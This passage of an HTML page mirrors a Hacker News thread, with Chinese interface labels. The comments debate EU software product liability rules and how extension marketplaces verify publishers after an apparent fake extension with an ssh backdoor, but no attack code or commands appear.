+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50313007">&gt; Really, this profession has become a complete clown show.<p>Always has been because there is so far zero liability for anything someone programs and distributes commercially. That's the <i>single root cause</i>. If not that software wouldn't be in general such major shit show. What we have is the result of being allowed to throw out even the most toxic shit out without any consequences if it causes damage, no mater how large the damage is. Software companies caused so far over the decades likely hundreds of billions, or even a few trillion damages in sum, yet nobody responsible ever got the bill. It's wild west—since now over 60 years. This has to stop finally!</p><p>Let's see where things will move as soon as we have regular product liability for software:</p><p><a href="https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=legissum:4792027" target="_blank" rel="noopener noreferrer">https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=legissum...</a></p><p>Just a few days left! Looking forward.</p></div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50313007">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50313007" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">rixed</span>
+        
+        <span>2026/10/31 14:18</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">That, and NIS2. Looks like a good trend, hopefully it's not just protectionism.</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50313676">That, and NIS2. Looks like a good trend, hopefully it's not just protectionism.</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50313676">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50313676" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">still_grokking</span>
+        
+        <span>2026/10/31 16:29</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">Well, if something than it's "anti-protectionism".<p>This is going to cause some major argument between the EU and the US, maybe even a trade war. Trouble is already underway:</p><p><a href="https://www.reuters.com/legal/government/us-lawmakers-urge-trump-act-against-eu-tech-rules-suggest-trade-probes-2026-07-21/" target="_blank" rel="noopener noreferrer">https://www.reuters.com/legal/government/us-lawmakers-urge-t...</a></p><p>Despite that I also think that this is the right and long overdue move on the EU side. We need to break the basic pattern that nobody cares as long as the responsible effectively never get the bill when they mess up.</p><p>Software is "Unsafe at Any Speed" [ <a href="https://en.wikipedia.org/wiki/Unsafe_at_Any_Speed" target="_blank" rel="noopener noreferrer">https://en.wikipedia.org/wiki/Unsafe_at_Any_Speed</a> ] to bring a striking analogy — even we have since about 60 years the tech to build software which <i>provably</i> (in the mathematical sense) matches its specification. Still what you have on the market is utter garbage, and instead of getting better it gets currently actually worse with lowering the garbage quality level even more with "AI" slop. That EU legislation could become the escape hatch; that's why I'm looking forward.</p></div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50314194">Well, if something than it's "anti-protectionism".<p>This is going to cause some major argument between the EU and the US, maybe even a trade war. Trouble is already underway:</p><p><a href="https://www.reuters.com/legal/government/us-lawmakers-urge-trump-act-against-eu-tech-rules-suggest-trade-probes-2026-07-21/" target="_blank" rel="noopener noreferrer">https://www.reuters.com/legal/government/us-lawmakers-urge-t...</a></p><p>Despite that I also think that this is the right and long overdue move on the EU side. We need to break the basic pattern that nobody cares as long as the responsible effectively never get the bill when they mess up.</p><p>Software is "Unsafe at Any Speed" [ <a href="https://en.wikipedia.org/wiki/Unsafe_at_Any_Speed" target="_blank" rel="noopener noreferrer">https://en.wikipedia.org/wiki/Unsafe_at_Any_Speed</a> ] to bring a striking analogy — even we have since about 60 years the tech to build software which <i>provably</i> (in the mathematical sense) matches its specification. Still what you have on the market is utter garbage, and instead of getting better it gets currently actually worse with lowering the garbage quality level even more with "AI" slop. That EU legislation could become the escape hatch; that's why I'm looking forward.</p></div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50314194">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50314194" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">duskdozer</span>
+        
+        <span>2026/10/31 16:38</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">I'm having trouble understanding what effects that directive could have. Liability under what circumstances and to what degree?</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50314223">I'm having trouble understanding what effects that directive could have. Liability under what circumstances and to what degree?</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50314223">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50314223" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">still_grokking</span>
+        
+        <span>2026/10/31 20:47</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">It's the biggest fundamental change which ever happened in how software is treated legally. This is a revolution!<p>Under the new legislation software products become regular products; there is no liability exception any more.</p><p>If you commercially distribute defective products to end user you're in general liable for the damages these defective products cause. <i>This now includes pure software just as any other (physical) product on the market.</i></p><p>If you don't know how product liability generally works in the EU, and what this means for software see here:</p><p><a href="https://cms.law/en/int/publication/the-new-eu-product-liability-directive-eu-2024-2853" target="_blank" rel="noopener noreferrer">https://cms.law/en/int/publication/the-new-eu-product-liabil...</a></p></div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50315698">It's the biggest fundamental change which ever happened in how software is treated legally. This is a revolution!<p>Under the new legislation software products become regular products; there is no liability exception any more.</p><p>If you commercially distribute defective products to end user you're in general liable for the damages these defective products cause. <i>This now includes pure software just as any other (physical) product on the market.</i></p><p>If you don't know how product liability generally works in the EU, and what this means for software see here:</p><p><a href="https://cms.law/en/int/publication/the-new-eu-product-liability-directive-eu-2024-2853" target="_blank" rel="noopener noreferrer">https://cms.law/en/int/publication/the-new-eu-product-liabil...</a></p></div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50315698">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50315698" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">Rohansi</span>
+        
+        <span>2026/10/31 09:04</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">I don't think even VSCode does this. Probably not even any package managers I know of? Code signing, yes, but not for organization verification? It's pretty much like a username - anyone can claim it if it is unclaimed?<p>edit: VSCode has a verified marker for publishers but I don't know how that works or if Cursor does the same.</p></div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50312207">I don't think even VSCode does this. Probably not even any package managers I know of? Code signing, yes, but not for organization verification? It's pretty much like a username - anyone can claim it if it is unclaimed?<p>edit: VSCode has a verified marker for publishers but I don't know how that works or if Cursor does the same.</p></div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50312207">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50312207" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">yunnpp</span>
+        
+        <span>2026/10/31 10:14</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">This is a solved problem, just look at how EFF's certbot works. You cannot just claim that you are porn.com unless you put a payload there that matches what the bot expects.</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50312613">This is a solved problem, just look at how EFF's certbot works. You cannot just claim that you are porn.com unless you put a payload there that matches what the bot expects.</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50312613">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50312613" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">Rohansi</span>
+        
+        <span>2026/10/31 12:15</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">And force everyone who wants to publish an extension to buy and manage a domain name? What if it expires? You're just replacing one set of problems with another.</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50313157">And force everyone who wants to publish an extension to buy and manage a domain name? What if it expires? You're just replacing one set of problems with another.</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50313157">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50313157" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">yunnpp</span>
+        
+        <span>2026/11/01 00:34</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">You don't need to force everyone, both an coexist in this context. I do believe a company with nearly a trillion dollars of planned expenditure can afford to buy a domain and renew it prior to expiration.</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50317632">You don't need to force everyone, both an coexist in this context. I do believe a company with nearly a trillion dollars of planned expenditure can afford to buy a domain and renew it prior to expiration.</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50317632">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50317632" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">Rohansi</span>
+        
+        <span>2026/11/01 00:54</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">Then you would have the same problem. Anthropic has no presence on the Cursor Marketplace, so what is stopping someone from claiming the name and just not associating a domain name?</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50317812">Then you would have the same problem. Anthropic has no presence on the Cursor Marketplace, so what is stopping someone from claiming the name and just not associating a domain name?</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50317812">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50317812" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">yunnpp</span>
+        
+        <span>2026/11/01 02:07</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">Nothing, but that extension would be flagged as "unknown" or "third-party" source or something and you'd get a big warning before proceeding to install it.<p>Also, a basic scan of the package would have flagged an ssh backdoor, no? It didn't seem to me like its obfuscation was very sophisticated.</p></div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50318436">Nothing, but that extension would be flagged as "unknown" or "third-party" source or something and you'd get a big warning before proceeding to install it.<p>Also, a basic scan of the package would have flagged an ssh backdoor, no? It didn't seem to me like its obfuscation was very sophisticated.</p></div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50318436">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50318436" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">dkersten</span>
+        
+        <span>2026/10/31 17:03</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">You could make it a requirement only for people who want to attribute “made by”. If you publish a no name extension, you could skip it.</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50314310">You could make it a requirement only for people who want to attribute “made by”. If you publish a no name extension, you could skip it.</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50314310">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50314310" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">skydhash</span>
+        
+        <span>2026/10/31 10:30</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">&gt; Code signing, yes, but not for organization verification<p>They don’t do organization verification, but they do verify where code comes from. You may be sure that packages are built by alpine, which made sure that the dist files comes from the sources that the maintainers added, and the latter ensure that the sources are correct. In truth, it’s a very small circle of trust.</p></div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50312683">&gt; Code signing, yes, but not for organization verification<p>They don’t do organization verification, but they do verify where code comes from. You may be sure that packages are built by alpine, which made sure that the dist files comes from the sources that the maintainers added, and the latter ensure that the sources are correct. In truth, it’s a very small circle of trust.</p></div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50312683">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50312683" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        
+      </div>
+    </details>
+  
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">feross</span>
+        
+        <span>2026/10/31 13:59</span>
+        <span class="badge">deleted</span>
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">[flagged]</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50313568">[flagged]</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50313568">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50313568" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  </div>
+      </div>
+    </details>
+  
+      </div>
+    </section>
+  </main>
+  <script>
+    
+  (() => {
+    function togglePair(primary, secondary, button, primaryLabel, secondaryLabel) {
+      const showSecondary = secondary.classList.contains("is-hidden");
+      primary.classList.toggle("is-hidden", showSecondary);
+      secondary.classList.toggle("is-hidden", !showSecondary);
+      button.textContent = showSecondary ? primaryLabel : secondaryLabel;
+    }
+
+    document.querySelectorAll('[data-action="toggle-raw"]').forEach((button) => {
+      button.addEventListener("click", () => {
+        const card = button.closest(".comment-body");
+        const zh = card?.querySelector('[data-role="comment-zh"]');
+        const raw = card?.querySelector('[data-role="comment-raw"]');
+        if (zh && raw) {
+          togglePair(zh, raw, button, "译文", "原文");
+        }
+      });
+    });
+
+    document.querySelectorAll('[data-action="toggle-expand"]').forEach((button) => {
+      button.addEventListener("click", () => {
+        const details = button.closest("details");
+        if (details) {
+          details.open = !details.open;
+          button.textContent = details.open ? "收起" : "展开";
+        }
+      });
+    });
+
+    document.querySelectorAll('[data-action="toggle-story-raw"]').forEach((button) => {
+      button.addEventListener("click", () => {
+        const zh = document.querySelector('[data-role="story-zh"]');
+        const raw = document.querySelector('[data-role="story-raw"]');
+        if (zh && raw) {
+          togglePair(zh, raw, button, "译文", "原文");
+        }
+      });
+    });
+  })();
+  
+  </script>
+</body>
+</html>
